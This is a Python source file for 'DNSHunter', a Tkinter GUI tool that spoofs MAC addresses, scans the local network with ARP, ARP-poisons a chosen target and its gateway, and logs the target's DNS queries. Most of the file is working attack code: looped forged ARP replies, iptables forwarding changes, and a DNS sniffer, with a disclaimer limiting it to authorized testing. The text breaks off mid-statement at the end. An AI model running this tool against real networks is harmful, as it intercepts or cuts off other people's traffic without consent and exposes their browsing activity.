#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DNSHunter is a GUI-based network attack and analysis tool. It provides the following features:

- **DNS Sniffer:** 
Captures and displays DNS queries made by a selected target device on the network. 
You can include or exclude domains containing specific keywords.

- **MAC Spoofer:** 
Allows you to spoof the MAC address of your network interface. You can set a specific MAC address, 
generate a random one, or restore the permanent MAC address.

- **Host Discovery:** 
Scans the local network to discover connected devices. You can select a target device for the attack 
from the discovered hosts.

- **ARP Spoofer:** 
Performs ARP spoofing to intercept or disrupt the target's network traffic. 
You can enable port forwarding to redirect the target's traffic for DNS sniffing, 
or disable it to cut off the target's network access.


**Note:**  
The graphical interface is optimized for displays with a resolution of 1080p (1920x1080) or higher. For optimal appearance and usability, 
ensure that your operating system's display scaling (DPI scaling or interface zoom) is set to 100%. 
Increasing the system-wide interface scaling may cause layout or rendering issues.


**Usage:**
1. Run the script with root privileges.
2. Use the MAC Spoofer to change your MAC address or restore it.
3. Use the Host Discovery feature to scan your network and select a target device.
4. Start the ARP Spoofer to intercept or disrupt the target's network traffic.
5. Use the DNS Sniffer to capture and analyze DNS queries from the target device.


**Disclaimer:**
This tool is intended for educational and authorized testing purposes only.
Do not use it for malicious activities or unauthorized access to networks or devices.

"""


import scapy.all as scapy
import time
import threading
import subprocess
import sys
import tkinter.messagebox as messagebox
import re
import os
import random
import sys
import tkinter as tk
from tkinter import ttk
import tkinter.messagebox as messagebox
import queue


def check_root():
    '''Check if the script is running with root privileges.'''
    try:
        user_privilege = subprocess.run(["id", "-u"], capture_output=True, text=True, check=True)

        if user_privilege.stdout.strip() != "0":
            messagebox.showerror("Permission Denied", "This program must be run as root.")
            sys.exit(1) 

    except subprocess.CalledProcessError as e:
        messagebox.showerror("Error", f"Failed to check root privileges: {e}")
        sys.exit(1)


def restart_program():
    ''' Restarts the current program'''
    python = sys.executable
    os.execl(python, python, *sys.argv)


def get_main_interface():
    '''Returns the main interface used for the default route using Scapy.'''
    routes = scapy.conf.route.routes
    
    for route in routes:
        network, netmask, gateway, iface, _, _ = route
        
        if network == 0 and netmask == 0:
            return iface
    return None


def check_interface():
    '''Check if there is a network interface available for the program to use.'''
    if get_main_interface() is None:
        messagebox.showerror(
    "No Interface",
    "No network interface is available or detected on this system. Please make sure you have an available interface before running the program."
)
        sys.exit(1)


# Define the functions for MAC Spoofer
def get_current_mac():
    '''Get the current MAC address of the selected interface (direct from system).'''
    interface = get_main_interface()
    try:
        with open(f"/sys/class/net/{interface}/address") as f:
            return f.read().strip().lower()
    except Exception:
        return "Unknown"


def get_permanent_mac():
    '''Get the permanent MAC address of the specified network interface using "ip a".'''
    interface = get_main_interface()
    try:
        # Run the "ip a" command for the specified interface
        result = subprocess.run(
            ["ip", "a", "show", interface],
            capture_output=True,
            text=True,
            check=True
        )
        # Extract the permanent MAC address using a regular expression
        match = re.search(r"permaddr\s+([0-9A-Fa-f:]{17})", result.stdout)
        if match:
            return match.group(1)
        else:
            return None
    except FileNotFoundError:
        messagebox.showerror("The 'ip' command is not available. Please ensure it is installed.")
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        messagebox.showerror(f"Error retrieving permanent MAC address: {e}")
        sys.exit(1)


def get_vendor(mac_address):
    '''Get the vendor name from the OUI file given a MAC address.'''
    try:
        oui = mac_address.lower().replace("-", ":")[:8]
        with open("ouis", "r") as file:
            for line in file:
                parts = line.strip().split(" - ", 1)
                if len(parts) == 2 and parts[0] == oui:
                    return parts[1]
        return "Unknow"
    except FileNotFoundError:
        return "FileNotFounnd"
    

def update_mac_status(event=None):
    '''Update the MAC status labels based on the selected interface.'''
    if get_permanent_mac() is None:
        mac = get_current_mac()
        vendor = get_vendor(mac)
        label_permanent_mac_value.config(text=mac)
        label_spoof_mac_value.config(text="")
        label_vendor_value.config(text=vendor)
    else:
        perm_mac = get_permanent_mac()
        spoofed = get_current_mac()
        vendor = get_vendor(spoofed)
        label_permanent_mac_value.config(text=perm_mac)
        label_spoof_mac_value.config(text=spoofed)
        label_vendor_value.config(text=vendor)


def random_oui():
    '''Generates a random Organizationally Unique Identifier (OUI) from a predefined list.'''
    random_number= random.randint(1, 19052)

    try:
        with open("ouis", "r") as file:
            for i, line in enumerate(file, start=1):
                if i == random_number:
                    parts = line.strip().split(" - ")
                    break
            return parts[0], parts[1]

    except FileNotFoundError:
        messagebox.showerror("File Not Found", "The '.ouis' file is missing. Please ensure it is in the same directory as the script.")
        sys.exit(1)


def random_nic():
    '''Generates a random Network Interface Controller (NIC) portion of a MAC address.'''
    hex_string = ""

    for _ in range(3):
        pair = ''.join(random.choice("0123456789abcdef") for _ in range(2))
        hex_string += pair + ":"

    return hex_string[:-1]
   

def random_mac():
    '''Combines a random OUI and NIC to generate a complete random MAC address.'''
    oui, vendor = random_oui()
    nic = random_nic()
    mac = f"{oui}:{nic}"

    return mac, vendor


def is_valid_mac( mac_address):
    '''Validates the format of the provided  MAC address with a regular expression.'''
    is_valid_mac_address = re.match(r'^([A-Fa-f0-9]{2}[:]){5}[A-Fa-f0-9]{02}$', mac_address)

    return  is_valid_mac_address


def change_mac_address(interface, mac_address):
    '''Changes the MAC address of the specified network interface to the provided MAC address.'''
    subprocess.run(["sudo", "ip", "link", "set", "dev", interface, "down"], check=True)
    subprocess.run(["sudo", "ip", "link", "set", "dev", interface, "address", mac_address], check=True)
    subprocess.run(["sudo", "ip", "link", "set", "dev", interface, "up"], check=True)
    # if the interface is a WiFi interface, restart the program to ensure proper operation
    if interface.startswith("w"):
        messagebox.showinfo(
            "Restart Required",
            "The MAC address of a WiFi interface has been changed. The program will restart to ensure proper operation."
        )
        restart_program()
        return  


def random_mac_button():
    '''Defines a button to generate a random MAC address and update the label values.'''
    interface = get_main_interface()
    randomized_mac, vendor = random_mac()

    if is_valid_mac(randomized_mac):
        change_mac_address(interface, randomized_mac)
        label_spoof_mac_value.config(text=randomized_mac)
        label_vendor_value.config(text=vendor)
        messagebox.showinfo("Success", "MAC address changed successfully!")
    else:
        messagebox.showerror("Invalid MAC Address", f"The MAC address '{randomized_mac}' is not valid.")


def restore_mac():
    ''' Defines a button to restore the permanent MAC address from the temporary file and update the labels values.'''
    permanent_mac = get_permanent_mac()

    if permanent_mac == get_current_mac() or permanent_mac is None:
        messagebox.showinfo("Info", "The MAC address is already restored.")
    else:
        
        change_mac_address(get_main_interface(), permanent_mac)
        label_spoof_mac_value.config(text="")
        label_vendor_value.config(text=get_vendor(permanent_mac))
        messagebox.showinfo("Success", f"MAC address restored successfully !")

def mac_spoof():
    '''Button to change the MAC address manually and update the label values.'''
    mac_address = entry_mac.get().lower()

    if is_valid_mac(mac_address):
        
        if get_permanent_mac() is None:
            label_spoof_mac_value.config(text="")
            label_vendor_value.config(text=get_vendor(mac_address))
            entry_mac.delete(0, tk.END)
            messagebox.showinfo("Info", "The MAC address is already the permanent one and has not been spoofed.")
            
        elif get_permanent_mac() == mac_address:
            label_spoof_mac_value.config(text="")
            label_vendor_value.config(text=get_vendor(mac_address))
            entry_mac.delete(0, tk.END)
            messagebox.showinfo("Success", f"MAC address restored successfully !")
        else:
            
            try:
                change_mac_address(get_main_interface(), mac_address)
                label_spoof_mac_value.config(text=mac_address)
                label_vendor_value.config(text=get_vendor(mac_address))
                entry_mac.delete(0, tk.END)
                messagebox.showinfo("Success", "MAC address changed successfully!")
            except:
                messagebox.showerror("Error", "Invalid MAC Address: The entered MAC address is not valid. Please try again.")
                entry_mac.delete(0, tk.END)
                return
    else:
        entry_mac.delete(0, tk.END)
        messagebox.showerror("Invalid MAC Address", f"The MAC address '{mac_address}' is not valid.")


# Define the functions for Host Discovery
def scan(ip):
    '''Scans the specified IP range and returns a list of devices found.'''
    arp_packet = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request = broadcast / arp_packet
    answered_list = scapy.srp(arp_request, timeout=1, verbose=False,iface= get_main_interface())[0]

    clients_list = []
    for element in answered_list:
        client_dict = {
            "ip": element[1].psrc,
            "mac": element[1].hwsrc
        }
        clients_list.append(client_dict)

    return clients_list


def get_ip_mac_selected(client_list):
    '''Get the selected IP and MAC address from the list of clients.'''
    try:
        gateway_ip = client_list[0]['ip']
        gateway_mac = client_list[0]['mac']
        target_ip = client_list[selected_device.get() - 1]['ip']
        target_mac = client_list[selected_device.get() - 1]['mac']

        return gateway_ip, gateway_mac, target_ip, target_mac

    except (IndexError, KeyError):
        return None, None, None, None


def cidr_is_valid(cidr):
    '''Validates the CIDR notation for the IP range.'''
    try:
        ip, mask = cidr.split('/')
        ip_parts = ip.split('.')

        if len(ip_parts) != 4:
            return False

        for part in ip_parts:
            if not part.isdigit() or int(part) < 0 or int(part) > 255:
                return False

        if not mask.isdigit() or int(mask) < 0 or int(mask) > 32:
            return False

        return True

    except ValueError:
        return False


def on_frame_configure(event):
    '''Adjust the scroll region of the canvas to fit the frame.'''
    canvas.configure(scrollregion=canvas.bbox("all"))


def scan_button():
    '''Defines a button to scan the network and display the devices with radiobuttons for selection.'''
    global selected_device
    global devices

    devices = scan(entry_cidr.get())
    selected_device = tk.IntVar(value=0)

    # Clear previous widgets in the output frame
    for widget in frame_output_cidr.winfo_children():
        widget.destroy()

    if cidr_is_valid(entry_cidr.get()):
        if devices:
            for counter, device in enumerate(devices, start=1):
                if counter == 1:
                    # Gateway row
                    tk.Label(
                        frame_output_cidr,
                        text="G",
                        font=("hack", 10),
                        fg="chartreuse",
                        bg="gray30"
                    ).grid(row=counter, column=0, padx=5, pady=2)

                else:
                    # Device row
                    tk.Label(
                        frame_output_cidr,
                        text=f"{counter - 1}",
                        font=("hack", 10),
                        fg="chartreuse",
                        bg="gray30"
                    ).grid(row=counter, column=0, padx=5, pady=2)

                # Common labels for IP and MAC
                tk.Label(
                    frame_output_cidr,
                    text=f"{device['ip']}",
                    font=("hack", 10),
                    fg="chartreuse",
                    bg="gray30",
                    anchor="w",
                    width=15  # Set a fixed width to ensure alignment
                ).grid(row=counter, column=1, padx=5, pady=2)

                tk.Label(
                    frame_output_cidr,
                    text=f"{device['mac']}",
                    font=("hack", 10),
                    fg="chartreuse",
                    bg="gray30"
                ).grid(row=counter, column=2, padx=15, pady=2)

                # Radiobutton for device selection
                if counter > 1:
                    radiobutton = tk.Radiobutton(
                        frame_output_cidr,
                        text="",
                        font=("hack", 10),
                        fg="black",            
                        bg="gray30",                
                        activebackground="gray30",
                        highlightthickness=0,
                        variable=selected_device,
                        value=counter
                    )
                    radiobutton.grid(row=counter, column=3, padx=1, pady=2)
                    radiobutton.select() 
        else:
            messagebox.showerror("No Devices Found",f"No devices found in the range '{entry_cidr.get()}'.")
    else:
        messagebox.showerror("Invalid IP Range", f"The IP range '{entry_cidr.get()}' is not valid.")


#Define the functions for ARP Spoofer
def enable_port_forwarding():
    '''Enables port forwarding by setting the FORWARD policy to ACCEPT and enabling IP forwarding.'''
    try:
        subprocess.run(["iptables", "--policy", "FORWARD", "ACCEPT"], check=True)
        subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"], check=True)
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Error",f"Error enabling port forwarding: {e}")


def disable_port_forwarding():
    '''Disables port forwarding by setting the FORWARD policy to DROP and disabling IP forwarding.'''
    try:
        subprocess.run(["iptables", "--policy", "FORWARD", "DROP"], check=True)
        subprocess.run(["sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward"], check=True)
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Error",f"Error disabling port forwarding: {e}")


def arp_spoof():
    '''Performs ARP spoofing by sending ARP packets to the target and gateway.'''
    global attack_in_progress
    global sniffer_active

    ip_gateway, mac_gateway, ip_target, mac_target = get_ip_mac_selected(devices)
    current_mac = scapy.get_if_hwaddr(scapy.conf.iface)

    if ip_gateway and mac_gateway and ip_target and mac_target and current_mac:
        # Create ARP packets for the target and gateway
        arp_packet_target = scapy.ARP(op=2, psrc=ip_gateway, pdst=ip_target, hwsrc=current_mac, hwdst=mac_target)
        arp_packet_gateway = scapy.ARP(op=2, psrc=ip_target, pdst=ip_gateway, hwsrc=current_mac, hwdst=mac_gateway)

        button_scan.config(state="disabled")
        attack_in_progress = True

        while attack_in_progress:
            scapy.send(arp_packet_target, verbose=False)
            scapy.send(arp_packet_gateway, verbose=False)

            # Send the message to the queue instead of updating the widget directly
            arp_output_queue.put(f"[+] Spoofing {ip_target} to {ip_gateway}\n")

            time.sleep(2)
    else:
        sniffer_active = False
        messagebox.showwarning("Error", "You need to scan the network and select a host.")

def process_arp_output_queue():
    '''Procesa los mensajes en la cola y actualiza el widget text_arp_output.'''
    while not arp_output_queue.empty():
        message = arp_output_queue.get()
        text_arp_output.config(state="normal")
        text_arp_output.insert(tk.END, message)
        text_arp_output.see(tk.END)
        text_arp_output.config(state="disabled")
    
    # Call this function again after a short delay 100ms
    root.after(100, process_arp_output_queue)


def restore():
    '''Restores the ARP tables of the target and gateway by sending ARP packets.'''
    ip_gateway, mac_gateway , ip_target, mac_target = get_ip_mac_selected(devices)
    arp_packet_target = scapy.ARP(op=2, psrc=ip_target, pdst=ip_gateway, hwsrc=mac_target, hwdst=mac_gateway)
    arp_packet_gateway = scapy.ARP(op=2, psrc=ip_gateway, pdst=ip_target, hwsrc=mac_gateway, hwdst=mac_target)   
    scapy.send(arp_packet_target, verbose=False)
    scapy.send(arp_packet_gateway, verbose=False)

      
# Define the functions for DNS Sniffer   
def add_keyword():
    '''Adds a keyword to the list of keywords to include or exclude.'''
    keyword = entry_keyword.get()

    if keyword:
        if any(char in keyword for char in special_characters):
            messagebox.showwarning("Warning", "Please enter a valid keyword without special characters.")
            return

        # Check if the keyword is already in the list
        if keyword in text_include_exclude.get("1.0", tk.END):
            messagebox.showwarning("Warning", "Keyword already exists in the list.")
            return

        # Add the keyword to the list
        text_include_exclude.config(state="normal")
        text_include_exclude.insert(tk.END, f"{keyword}\n")
        text_include_exclude.config(state="disabled")
        entry_keyword.delete(0, tk.END)
    else:
        messagebox.showwarning("Warning", "Please enter a keyword to add.")


def clear_text_widget(text_widget):
    ''' Clears the content of the specified Text widget.'''
    text_widget.config(state="normal")
    text_widget.delete("1.0", tk.END)
    text_widget.config(state="disabled")
    text_widget.delete(0, tk.END)


def get_keywords():
    ''' Retrieves the list of keywords from the Text widget.'''
    keywords = text_include_exclude.get("1.0", tk.END).strip().split("\n")
    return [keyword for keyword in keywords if keyword] 


def update_dns_output(domain):
    '''Updates the DNS output text widget with the given domain.'''
    text_dns_output.config(state="normal")
    text_dns_output.insert(tk.END, f"[+] {domain.rstrip('.')}\n")
    text_dns_output.see(tk.END)
    text_dns_output.config(state="disabled")

def processs_dns_packet(packet):
    '''Processes DNS packets and extracts the domain name and includes/excludes keywords.'''
    if packet.haslayer(scapy.DNSQR):
        domain = packet[scapy.DNSQR].qname.decode('utf-8')
        include_or_exclude = combobox_include_exclude.get()
        keywords = get_keywords()

        if not keywords:
            if domain not in domain_seen:
                domain_seen.add(domain)
                update_dns_output(domain)
        else:
            if include_or_exclude == "Include keywords":
                if domain not in domain_seen and any(keyword in domain for keyword in keywords):
                    domain_seen.add(domain)
                    update_dns_output(domain)  
            elif include_or_exclude == "Exclude keywords":
                if domain not in domain_seen and not any(keyword in domain for keyword in keywords):
                    domain_seen.add(domain)
                    update_dns_output(domain)


def sniff_dns_packets():
    '''Sniffs DNS packets and processes them using the processs_dns_packet function.'''
    global domain_seen

    domain_seen = set()
    interface = get_main_interface()


    def stop_filter(packet):
        '''Stops the sniffing process when the stop_sniffer_event is set.'''
        return stop_sniffer_event.is_set()  # Stop sniffing if the event is set

    scapy.sniff(
        iface=interface,
        filter="udp and port 53",
        prn=processs_dns_packet,
        store=0,
        stop_filter=stop_filter  # Stop sniffing when the event is set
    )


#Define the functions to start and stop the attack
def start_attack():
    '''Button to start the ARP spoofing attack and DNS sniffing.'''
    global attack_in_progress
    global sniffer_active

    if not attack_in_progress:
        # Clear output widgets
        clear_text_widget(text_dns_output)
        clear_text_widget(text_arp_output)

        # Check port forwarding state
        if switch_portforwarding.get_state():
            enable_port_forwarding()
            sniffer_active = True
        else:
            sniffer_active = False
            disable_port_forwarding()

        # Start ARP spoofing in a separate thread
        thread_arp_spoof = threading.Thread(target=arp_spoof, daemon=True)
        thread_arp_spoof.start()

        # Start DNS sniffing if port forwarding is enabled
        if sniffer_active:
            stop_sniffer_event.clear()
            thread_dns_sniff = threading.Thread(target=sniff_dns_packets, daemon=True)
            thread_dns_sniff.start()
    else:
        messagebox.showinfo("Info", "The attack is already in progress.")


def stop_attack():
    '''Button to stop the ARP spoofing attack and DNS sniffing.'''
    global attack_in_progress
    global sniffer_active

    if attack_in_progress:
        # Stop the attack and restore settings
        attack_in_progress = False
        stop_sniffer_event.set()
        restore()
        sniffer_active = False
        button_scan.config(state="normal")

        # Update ARP output widget
        text_arp_output.config(state="normal")
        text_arp_output.insert(tk.END, "[!] Stopping ARP Spoofing...\n")
        text_arp_output.insert(tk.END, "[-] Restoring ARP tables...\n")
        text_arp_output.see(tk.END)
        text_arp_output.config(state="disabled")

        # Disable port forwarding
        disable_port_forwarding()
        messagebox.showinfo("Info", "The attack has been stopped.")
    else:
        messagebox.showinfo("Info", "There is no ongoing attack to stop.")


# Define the custom switch class
class CustomSwitch(tk.Canvas):
    def __init__(self, parent, width=50, height=15, bg="black", active_bg="chartreuse", inactive_bg="gray", command=None):
        super().__init__(parent, width=width, height=height, bg=bg, highlightthickness=0)
        self.command = command
        self.active_bg = active_bg
        self.inactive_bg = inactive_bg
        self.switch_on = True  # Initial state set to active

        # Calculate the size of the circle based on the initial height
        self.circle_margin = 2
        self.circle_diameter = height - 2 * self.circle_margin

        # Draw the background of the switch
        self.switch_bg = self.create_rectangle(0, 0, width, height, fill=self.active_bg, outline="")
        # Draw the circle of the switch
        self.switch_circle = self.create_oval(0, 0, 0, 0, fill="black", outline="")

        # Position the circle after the widget has been rendered
        self.after(10, self._initialize_circle)

        # Bind the click event
        self.bind("<Button-1>", self.toggle)

        # Execute the associated command (if any) during initialization
        if self.command:
            self.command(self.switch_on)

    def _initialize_circle(self):
        """Position the circle based on the initial state."""
        if self.switch_on:
            self.coords(
                self.switch_circle,
                self.winfo_width() - self.circle_diameter - self.circle_margin,
                self.circle_margin,
                self.winfo_width() - self.circle_margin,
                self.circle_diameter + self.circle_margin
            )
        else:
            self.coords(
                self.switch_circle,
                self.circle_margin,
                self.circle_margin,
                self.circle_diameter + self.circle_margin,
                self.circle_diameter + self.circle_margin
            )

    def toggle(self, event=None):
        """Toggle the state of the switch."""
        self.switch_on = not self.switch_on

        if self.switch_on:
            # Change to active state
            self.itemconfig(self.switch_bg, fill=self.active_bg)
            self.coords(
                self.switch_circle,
                self.winfo_width() - self.circle_diameter - self.circle_margin,
                self.circle_margin,
                self.winfo_width() - self.circle_margin,
                self.circle_diameter + self.circle_margin
            )
        else:
            # Change to inactive state
            self.itemconfig(self.switch_bg, fill=self.inactive_bg)
            self.coords(
                self.switch_circle,
                self.circle_margin,
                self.circle_margin,
                self.circle_diameter + self.circle_margin,
                self.circle_diameter + self.circle_margin
            )

        # Execute the associated command (if any)
        if self.command:
            self.command(self.switch_on)

    def get_state(self):
        """Get the current state of the switch."""
        return self.switch_on


# start the DNSHunter program
if "__main__" == __name__:
    #Variables
    devices = [] #
    selected_device = None
    attack_in_progress = False
    sniffer_active = False

    stop_sniffer_event = threading.Event()
    arp_output_queue = queue.Queue()
    special_characters = ['/', '!', '@', '#', '$', '%', '^',
        '&', '*','(', ')', '+', '=', '{', '}', '[', ']', ':',
        ';', '"', "'", '<', '>', ',', '?']


    check_root()
    check_interface()


    # GUI Setup
    root = tk.Tk()
    root.title("DNSHunter")
    root.configure(bg="gray14")
    root.resizable(False, False)

    # screen size and position
    width_window = 800
    height_window = 890
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    axis_x = int((screen_width/2)-(width_window/2))
    axis_y = int((screen_height/2)-(height_window/2))-37

    root.geometry("{}x{}+{}+{}".format(width_window, height_window, axis_x, axis_y ))


    # Styles ttk
    style = ttk.Style()
    style.theme_use("clam")  

    style.configure(
        "Custom.TEntry",
        fieldbackground="black",
        foreground="chartreuse",
        bordercolor="chartreuse",
        lightcolor="chartreuse",
        darkcolor="chartreuse"
    )

    style.configure(
        "Custom.TCombobox",
        fieldbackground="black",
        foreground="chartreuse",
        background="black",
        arrowcolor="chartreuse",
        bordercolor="chartreuse"
    )

    style.configure(
        "TListbox",
        background="black",
        foreground="chartreuse",
        selectbackground="black",
        selectforeground="chartreuse"
    )

    style.map(
        "Custom.TCombobox",
        fieldbackground=[("readonly", "black")],
        foreground=[("readonly", "chartreuse")],
        background=[("readonly", "black")],
        bordercolor=[("readonly", "chartreuse")]
    )

    style.configure(
        "Custom.Vertical.TScrollbar",
        background="black",
        troughcolor="gray30",
        bordercolor="chartreuse",
        arrowcolor="chartreuse",
    )

    style.map(
        "Custom.Vertical.TScrollbar",
        background=[("active", "gray14")],
        arrowcolor=[("active", "white")],
        troughcolor=[("active", "gray14")],
    )


    # Widgets for MAC Spoofer
    frame_mac = tk.Frame(root, bg="black", border=1, relief="solid", highlightbackground="chartreuse",highlightcolor="chartreuse", highlightthickness=2)
    frame_mac.place(x=10, y=10, width=385, height=275)

    label_status = tk.Label(frame_mac, text="MAC Status",font=("hack", 10, "bold"), fg="DarkOliveGreen4", bg="gray14")
    label_status.place(x=4, y=3, width=371, height=30)

    label_permanent_mac = tk.Label(frame_mac, text="Permanent MAC Address :",font=("hack", 10, "bold"), fg="chartreuse", bg="black", anchor="w")
    label_permanent_mac.place(x=5, y=38, width=188, height=25)

    label_permanent_mac_value = tk.Label(frame_mac, text="",font=("hack", 10), fg="chartreuse", bg="black")
    label_permanent_mac_value.place(x=225, y=38, width=150, height=25)

    label_spoof_mac = tk.Label(frame_mac, text="Spoofed MAC Address :",font=("hack", 10, "bold"), fg="chartreuse", bg="black", anchor="w")
    label_spoof_mac.place(x=5, y=65, width=180, height=25)

    label_spoof_mac_value = tk.Label( frame_mac, text="",font=("hack", 10), fg="magenta1", bg="black")
    label_spoof_mac_value.place(x=225, y=65, width=150, height=25)

    label_vendor = tk.Label(frame_mac, text="Vendor : ",font=("hack", 10, "bold"), fg="chartreuse", bg="black", anchor="w")
    label_vendor.place(x=5, y=92, width=81, height=25)

    label_vendor_value = tk.Label(frame_mac, text="",font=("hack", 10), fg="chartreuse", bg="black", anchor="w")
    label_vendor_value.place(x=75, y=92, width=305, height=25)

    label_mac_spoofer = tk.Label(frame_mac, text="MAC Spoofer",font=("hack", 10, "bold"), fg="DarkOliveGreen4", bg="gray14")
    label_mac_spoofer.place(x=4, y=120, width=371, height=30)

    label_interface = tk.Label(frame_mac, text="Interface :",font=("hack", 10, "bold"), fg="chartreuse", bg="black", anchor="w")
    label_interface.place(x=5, y=160, width=88, height=25)

    label_interface_value = tk.Label(frame_mac, text=get_main_interface(), font=("hack", 10), fg="chartreuse", bg="black")
    label_interface_value.place(x=120, y=160, width=90, height=25)

    update_mac_status()

    label_mac = tk.Label(frame_mac, text="MAC Address",font=("hack",10, "bold"), fg="chartreuse", bg="black", anchor="w")
    label_mac.place(x=5, y=195, width=100, height=25)

    entry_mac = ttk.Entry(frame_mac, font=("hack", 10), style="Custom.TEntry")
    entry_mac.place(x=120, y=195, width=150, height=25)

    button_macspoof = tk.Button(
        frame_mac,
        text="Spoof",
        font=("hack", 10),
        fg="DarkOliveGreen4",
        bg="gray14",
        activeforeground="chartreuse",
        activebackground="black",
        highlightbackground="chartreuse",
        highlightcolor="magenta",
        highlightthickness=2,
        command=mac_spoof        
    )
    button_macspoof.place(x=280, y=195, width=60, height=25)

    button_random_mac =  tk.Button(
        frame_mac,
        text="Random MAC",
        font=("hack", 10),
        fg="DarkOliveGreen4",
        bg="gray14",
        activeforeground="chartreuse",
        activebackground="black",
        highlightbackground="chartreuse",
        highlightcolor="magenta",
        highlightthickness=2,
        command=random_mac_button        
    )
    button_random_mac.place(x=200, y=235, width=100, height=25)

    button_restore = tk.Button(
        frame_mac,
        text="Restore",
        font=("hack", 10),
        fg="Magenta1",
        bg="gray14",
        activeforeground="black",
        activebackground="Magenta1",
        highlightbackground="chartreuse",
        highlightcolor="magenta",
        highlightthickness=2,
        command=restore_mac        
    )
    button_restore.place(x=80, y=235, width=100, height=25)


    # Widgets for host discovery
    frame_cidr = tk.Frame(root,  bg="black", border=1, relief="solid", highlightbackground="chartreuse", highlightcolor="chartreuse",  highlightthickness=2)
    frame_cidr.place(x=405, y=10, width=385, height=275)

    label_host_discovery = tk.Label(frame_cidr, text="Host Discovery",font=("hack", 10, "bold"), fg="DarkOliveGreen4", bg="gray14")
    label_host_discovery.place(x=4, y=3, width=371, height=30)

    label_cidr = tk.Label(frame_cidr, text="CIDR",font=("hack", 10, "bold"), fg="chartreuse", bg="black")
    label_cidr.place(x=5, y=45, width=60, height=25)

    entry_cidr = ttk.Entry(frame_cidr, font=("hack", 10), style="Custom.TEntry")
    entry_cidr.place(x=70, y=45, width=140, height=25)
    entry_cidr.insert(0, "192.168.1.0/24")

    button_scan = tk.Button(
        frame_cidr,
        text="Scan",
        font=("hack", 10),
        fg="DarkOliveGreen4",  
        bg="gray14",       
        activeforeground="chartreuse",  
        activebackground="black",   
        highlightbackground="chartreuse",  
        highlightcolor="magenta",  
        highlightthickness=2,
        command=scan_button        
    )
    button_scan.place(x=250, y=45, width=70, height=25)

    # Create a custom scrollbar
    canvas = tk.Canvas(frame_cidr, bg="gray30", highlightthickness=0)
    canvas.place(x=5, y=80, width=369, height=184)

    scrollbar = ttk.Scrollbar(frame_cidr, orient="vertical", command=canvas.yview, style="Custom.Vertical.TScrollbar")
    scrollbar.place(x=360, y=80, height=184)

    canvas.configure(yscrollcommand=scrollbar.set)

    frame_output_cidr = tk.Frame(canvas, bg="gray30")
    canvas.create_window((0, 0), window=frame_output_cidr, anchor="nw")

    frame_output_cidr.bind("<Configure>", on_frame_configure)


    # Widgets for ARP Spoofer
    frame_arp = tk.Frame(root,  bg="black", border=1, relief="solid", highlightbackground="chartreuse",highlightcolor="chartreuse", highlightthickness=2)
    frame_arp.place(x=10, y=290, width=780, height=200)

    label_arp = tk.Label(frame_arp, text="ARP Spoofer",font=("hack", 10, "bold"), fg="DarkOliveGreen4", bg="gray14")
    label_arp.place(x=4, y=3, width=766, height=30)

    text_arp_output = tk.Text(frame_arp,font=("hack", 10), fg="chartreuse", bg="gray30", state="disabled")
    text_arp_output.place(x=5, y=84, width=765, height=107)

    label_text_switch = tk.Label(frame_arp, text="Enable or disable port forwarding for ARP spoofing",font=("hack", 10), fg="chartreuse", bg="black")
    label_text_switch.place(x=5, y=48, width=500, height=25)

    # Custom Switch for Port Forwarding
    switch_portforwarding = CustomSwitch(
        frame_arp,
        width=60,
        height=13,  
        bg="black",
        active_bg="chartreuse",
        inactive_bg="Magenta4"
        )
    switch_portforwarding.place(x=700, y=54, width=25, height=15)


    # widgets for DNS Sniffer
    frame_dns = tk.Frame(root, bg="black", border=1, relief="solid", highlightbackground="chartreuse",highlightcolor="chartreuse", highlightthickness=2)
    frame_dns.place(x=10, y=495, width=780, height=350)

    label_dns = tk.Label(frame_dns, text="DNS Sniffing",font=("hack", 10, "bold"), fg="DarkOliveGreen4", bg="gray14")
    label_dns.place(x=4, y=3, width=766, height=30)

    text_dns_output = tk.Text(frame_dns,font=("hack", 10), fg="chartreuse", bg="gray30", state="disabled")
    text_dns_output.place(x=5, y=50, width=550, height=290)

    combobox_include_exclude = ttk.Combobox(
        frame_dns,
        state="readonly",
        values=["Include keywords", "Exclude keywords"],
        font=("hack", 10),
        style="Custom.TCombobox"
    )
    combobox_include_exclude.place(x=560, y=50, width=155, height=25)
    combobox_include_exclude.current(0) # Select the first element by default

    # # Force the Combobox to use the custom style
    combobox_include_exclude.option_add("*TCombobox*Listbox*Background", "black")
    combobox_include_exclude.option_add("*TCombobox*Listbox*Foreground", "chartreuse")
    combobox_include_exclude.option_add("*TCombobox*Listbox*SelectBackground", "gray14")
    combobox_include_exclude.option_add("*TCombobox*Listbox*SelectForeground", "chartreuse")


    entry_keyword = ttk.Entry(frame_dns, font=("hack", 10), style="Custom.TEntry")
    entry_keyword.place(x=560, y=315, width=155, height=25)

    text_include_exclude = tk.Text(frame_dns,font=("hack", 10), fg="chartreuse", bg="gray30", state="disabled")
    text_include_exclude.place(x=560, y=77, width=210, height=235)

    button_add_keywords = tk.Button(
        frame_dns,
        text="Add",
        font=("hack", 10),
        fg="DarkOliveGreen4",
        bg="gray14",
        activeforeground="chartreuse",
        activebackground="black",
        highlightbackground="chartreuse",
        highlightcolor="magenta",
        highlightthickness=2,
        command=add_keyword
    )
    button_add_keywords.place(x=720, y=315, width=50, height=25)

    button_clear_keywords = tk.Button(
        frame_dns,
        text="Clear",
        font=("hack", 10),
        fg="Magenta1",
        bg="black",
        activeforeground="black",
        activebackground="Magenta1",
        highlightbackground="chartreuse",
        highlightcolor="magenta",
        highlightthickness=2,
        command= lambda: clear_text_widget(text_include_exclude)
    )
    button_clear_keywords.place(x=720, y=50, width=50, height=25)

    button_start_attack = tk.Button(
        root,
        text="Start",
        font=("hack", 10),
        fg="chartreuse",
        bg="black",
        activeforeground="black",
        activebackground="chartreuse",
        highlightbackground="chartreuse",
        highlightcolor="magenta",
        highlightthickness=2,
        command=start_attack
    )
    button_start_attack.place(x=530, y=850, width=100, height=30)

    button_stop_attack = tk.Button(
        root,
        text="Stop",
        font=("hack", 10),
        fg="Magenta1",
        bg="black",
        activeforeground="black",
        activebackground="Magenta1",
        highlightbackground="chartreuse",
        highlightcolor="magenta",
        highlightthickness=2,
        command=stop_attack
